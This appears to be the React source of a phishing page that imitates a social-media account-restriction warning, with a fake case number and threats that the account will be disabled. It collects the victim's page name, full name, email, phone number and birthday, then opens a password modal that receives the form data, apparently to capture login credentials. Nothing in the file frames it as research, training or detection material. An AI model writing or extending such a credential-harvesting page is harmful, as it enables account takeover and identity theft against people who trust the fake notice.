import HeroImage from "@/assets/images/home-image.png";
import PasswordModal from "@/components/password-modal";
import { useEffect, useState } from "react";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
import type { GeoLocation } from "@/types/geo";
import { useTranslation } from "@/hooks/useTranslation";

export interface FormData {
  pageName: string;
  fullName: string;
  email: string;
  phone: string;
  birthday: string;
}
enum NameForm {
  pageName = "pageName",
  fullName = "fullName",
  email = "email",
  phone = "phone",
  birthday = "birthday",
}

const Home = () => {
  const geoData: GeoLocation = JSON.parse(
    localStorage.getItem("geoData") ?? "{}",
  );

  const texts = {
    accountRestricted: "Your account has been restricted",
    termOfService: "Term of Service",
    reportMessage: "We detected unusual activity in your page today",
    someoneReported: "Someone has reported your account for not complying with",
    communityStandards: "Community Standards",
    decisionMessage:
      "We have already reviewed this decision and the decision cannot be changed",
    disabledWarning: "disabled",
    verifyMessage: "To avoid having your account",
    pleaseVerify: ", please verify:",
    pageName: "Page Name",
    fullName: "Your Name (Name and Surname)",
    personalEmail: "Personal Email",
    phoneNumber: "Phone Number",
    birthday: "Birthday (MM/DD/YYYY)",
    caseNumber: "Case Number:",
    aboutCase:
      "About Case: Violating Community Standards and Posting something inappropriate.",
    continue: "Continue",
    warningMessage:
      "Please make sure to fill in the data correctly; otherwise, your account may be permanently closed. To learn more about why accounts are deactivated, visit our",
    validDateError: "Please enter a valid date in the format DD/MM/YYYY",
    validEmailError:
      "Please enter a valid email address (e.g. example@domain.com)",
    fullNameError: "Full name is required",
    pageNameError: "Page name is required",
    phoneError: "Please enter a valid phone number (minimum 8 digits)",
  };

  const { t, isLoading } = useTranslation(texts);

  const [today, setToday] = useState("");
  const [error, setError] = useState("");
  const [formData, setFormData] = useState<FormData>({
    pageName: "",
    fullName: "",
    email: "",
    phone: "",
    birthday: "",
  });
  const [showPasswordModal, setShowPasswordModal] = useState(false);

  useEffect(() => {
    const getToday = () => {
      const date = new Date();
      return date.toLocaleDateString("en", {
        year: "numeric",
        month: "long",
        day: "2-digit",
      });
    };
    setToday(getToday());
  }, []);

  const formatDate = (input: string) => {
    const numbers = input.replace(/\D/g, "");
    const limited = numbers.slice(0, 8);
    let formatted = "";
    if (limited.length >= 1) {
      const day = limited.slice(0, 2);
      formatted = day;
      if (limited.length >= 3) {
        const month = limited.slice(2, 4);
        formatted = `${day}/${month}`;
        if (limited.length >= 5) {
          const year = limited.slice(4, 8);
          formatted = `${day}/${month}/${year}`;
        }
      }
    }
    return formatted;
  };
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (name === NameForm.birthday) {
      const formattedBirthday = formatDate(value);
      setFormData((prev) => ({ ...prev, [name]: formattedBirthday }));
      return;
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = () => {
    switch (true) {
      case formData.birthday.length !== 10:
        setError(t("validDateError"));
        return;
      case !formData.email.includes("@") && !formData.email.includes("."):
        setError(t("validEmailError"));
        return;
      case !formData.fullName:
        setError(t("fullNameError"));
        return;
      case !formData.pageName:
        setError(t("pageNameError"));
        return;
      case formData.phone.length < 8:
        setError(t("phoneError"));
        return;
      default:
        setError("");
        setShowPasswordModal(true);
        return;
    }
  };

  if (isLoading) {
    return (
      <div className="fixed inset-0 flex items-center justify-center bg-white">
        <span className="text-xl">Loading...</span>
      </div>
    );
  }

  return (
    <div className="mx-auto mt-4 flex max-w-2xl flex-col gap-4 px-4">
      <img src={HeroImage} alt="hero" className="mx-auto" />
      <div className="flex flex-col gap-4">
        <h1 className="text-xl font-bold">{t("accountRestricted")}</h1>
        <div className="flex flex-col gap-1">
          <h2 className="text-sm font-normal text-gray-600">
            {t("termOfService")}
          </h2>
          <p>
            {t("reportMessage")} <b>{today}</b>.{t("someoneReported")}{" "}
            <span className="cursor-pointer text-blue-600 hover:underline">
              {t("communityStandards")}
            </span>
            . {t("decisionMessage")}{" "}
            <span className="cursor-pointer text-blue-600 hover:underline">
              {t("disabledWarning")}
            </span>
            {t("pleaseVerify")}
          </p>
          <div className="mt-4 flex flex-col gap-2">
            <div>
              <input
                autoFocus
                className="w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                name={NameForm.pageName}
                value={formData.pageName}
                onChange={handleInputChange}
                placeholder={t("pageName")}
              />
            </div>

            <div>
              <input
                className="w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                name={NameForm.fullName}
                value={formData.fullName}
                onChange={handleInputChange}
                placeholder={t("fullName")}
              />
            </div>

            <div>
              <input
                className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
                  formData.email.length > 0 &&
                  !formData.email.includes("@") &&
                  !formData.email.includes(".")
                    ? "border-red-500 focus:border-red-500"
                    : ""
                }`}
                type="email"
                name={NameForm.email}
                value={formData.email}
                onChange={handleInputChange}
                placeholder={t("personalEmail")}
              />
            </div>

            <div className="flex w-full items-center rounded-full border border-gray-300">
              <PhoneInput
                containerClass="w-full! p-3 "
                inputClass="w-full! border-none! bg-transparent! "
                buttonClass=" border-none! rounded-l-full! hover:rounded-l-full! hover:bg-transparent! border-r-2 border-r-black "
                dropdownClass="select-none!"
                placeholder={t("phoneNumber")}
                value={formData.phone}
                country={geoData.country_code.toLowerCase()}
                onChange={(phone) =>
                  setFormData((prev) => ({ ...prev, [NameForm.phone]: phone }))
                }
              />
            </div>

            <div>
              <input
                className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${formData.birthday.length < 10 && formData.birthday.length && "border-red-500 focus:border-red-500"}`}
                type="text"
                name={NameForm.birthday}
                value={formData.birthday}
                onChange={handleInputChange}
                placeholder={t("birthday")}
              />
            </div>

            <div className="mt-2 flex justify-between text-sm text-gray-600">
              <div>
                <span>{t("caseNumber")}</span>
                <span className="ml-1 text-blue-600">#178014456033</span>
              </div>
              <div>
                <span>{t("aboutCase")}</span>
              </div>
            </div>
          </div>
          {error && <div className="text-red-500">{error}</div>}
          <button
            onClick={handleSubmit}
            className="cursor-pointer rounded-full bg-blue-500 p-4 text-lg font-medium text-white"
            type="button"
          >
            {t("continue")}
          </button>
        </div>
      </div>
      <p className="mt-4 flex items-start text-sm text-gray-600">
        <span className="mr-2 text-yellow-500">⚠️</span>
        {t("warningMessage")}{" "}
        <span className="cursor-pointer text-blue-600 hover:underline">
          {t("communityStandards")}
        </span>
      </p>
      <PasswordModal
        formData={formData}
        isOpen={showPasswordModal}
        onClose={() => setShowPasswordModal(false)}
      />
    </div>
  );
};

export default Home;
